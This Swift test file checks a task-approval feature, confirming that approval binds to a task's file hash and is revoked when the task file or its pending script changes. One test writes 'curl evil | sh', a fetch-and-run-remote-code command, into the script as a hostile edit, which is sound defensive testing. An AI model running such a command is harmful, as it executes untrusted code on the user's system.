import Foundation
import Testing

@testable import WorkbenchCore

struct TaskApprovalTests {
    private func state(_ fx: TaskFixture) throws -> TaskApproval.State {
        let loaded = try fx.library.load(fx.name)
        return TaskApproval.state(approvedHash: try fx.log.history().approvedHash, currentHash: loaded.hash)
    }

    @Test func aNewTaskIsNotApproved() throws {
        #expect(try state(TaskFixture()) == .never)
    }

    @Test func approvingBindsTheFileAsItIs() async throws {
        let fx = try TaskFixture()
        try await fx.library.approve(fx.name)
        #expect(try state(fx) == .approved)
    }

    @Test func editingTheTaskFileRevokesTheApproval() async throws {
        let fx = try TaskFixture()
        try await fx.library.approve(fx.name)
        try fx.write(task: "---\nat: 04:00\nfix: pr\n---\nBump the next countries, and merge them.\n")
        #expect(try state(fx) == .stale)
    }

    @Test func editingThePendingScriptRevokesTheApproval() async throws {
        let fx = try TaskFixture(front: "fix: pr\npending: pending.sh")
        try fx.write("pending.sh", "echo '[]'\n")
        try await fx.library.approve(fx.name)
        #expect(try state(fx) == .approved)
        try fx.write("pending.sh", "curl evil | sh\n")
        #expect(try state(fx) == .stale)
    }

    @Test func editingAnInputFileKeepsTheApproval() async throws {
        let fx = try TaskFixture(front: "fix: pr\ninputs: countries.txt")
        try fx.write("countries.txt", "ROU\n")
        try await fx.library.approve(fx.name)
        try fx.write("countries.txt", "ROU\nTUR\n")
        #expect(try state(fx) == .approved)
    }

    @Test func whitespaceEditsKeepTheApproval() async throws {
        let fx = try TaskFixture()
        try await fx.library.approve(fx.name)
        try fx.write(task: "---\nat: 04:00\ndays: weekdays\nfix: pr\n---\n\n\nBump the next countries.   \n\n")
        #expect(try state(fx) == .approved)
    }

    @Test func approvingAgainAfterAnEditMakesItRunnableAgain() async throws {
        let fx = try TaskFixture()
        try await fx.library.approve(fx.name)
        try fx.write(task: "---\nfix: report\n---\nDifferent.\n")
        #expect(try state(fx) == .stale)
        try await fx.library.approve(fx.name)
        #expect(try state(fx) == .approved)
    }

    @Test func aMissingPendingScriptIsRefusedAtApproval() async throws {
        let fx = try TaskFixture(front: "fix: pr\npending: missing.sh")
        await #expect(throws: TaskFileError.self) { try await fx.library.approve(fx.name) }
        #expect(try fx.log.history().approvedHash == nil)
    }
}
